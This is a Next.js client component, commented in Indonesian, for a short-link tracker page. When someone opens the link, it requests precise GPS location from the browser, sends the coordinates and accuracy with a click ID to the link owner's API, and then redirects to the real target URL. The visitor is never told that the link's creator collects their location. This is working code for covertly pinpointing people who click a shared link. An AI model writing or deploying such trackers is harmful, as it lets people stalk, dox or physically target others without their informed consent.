"use client";

import { useEffect, useState } from "react";

interface TrackerClientProps {
  code: string;
  targetUrl: string | null;
  clickId: number | null;
}

export default function TrackerClient({ code, targetUrl, clickId }: TrackerClientProps) {
  const [status, setStatus] = useState("Memuat...");

  useEffect(() => {
    setStatus("Script client jalan.");

    if (!targetUrl) {
      setStatus("STOP: target_url kosong dari server. Link kemungkinan gak valid.");
      return;
    }

    const redirectNow = (reason: string) => {
      setStatus(`Redirect (${reason})...`);
      window.location.replace(targetUrl);
    };

    if (!navigator.geolocation) {
      setStatus("Browser gak support geolocation, langsung redirect.");
      redirectNow("no-geo-support");
      return;
    }

    let redirected = false;

    setStatus("Meminta izin lokasi... (tunggu popup GPS)");

    const timer = setTimeout(() => {
      if (!redirected) {
        redirected = true;
        redirectNow("timeout-8s");
      }
    }, 8000);

    navigator.geolocation.getCurrentPosition(
      async (pos) => {
        setStatus("GPS didapat, kirim data...");
        try {
          await fetch(`/api/t-geo/${code}`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              click_id: clickId,
              gps_latitude: pos.coords.latitude,
              gps_longitude: pos.coords.longitude,
              gps_accuracy: pos.coords.accuracy,
            }),
          });
        } catch (err) {
          setStatus(`Gagal kirim GPS: ${String(err)}`);
        }

        clearTimeout(timer);
        if (!redirected) {
          redirected = true;
          redirectNow("gps-success");
        }
      },
      (err) => {
        setStatus(`GPS ditolak/gagal (code ${err.code}): ${err.message}`);
        clearTimeout(timer);
        if (!redirected) {
          redirected = true;
          redirectNow("gps-error");
        }
      },
      { enableHighAccuracy: true, timeout: 7000, maximumAge: 0 }
    );
  }, [code, targetUrl, clickId]);

  return (
    <div
      style={{
        minHeight: "100vh",
        background: "#0a0a0a",
        color: "#fff",
        display: "flex",
        alignItems: "center",
        justifyContent: "center",
        padding: "24px",
        fontFamily: "monospace",
        fontSize: "14px",
        textAlign: "center",
      }}
    >
      {status}
    </div>
  );
}
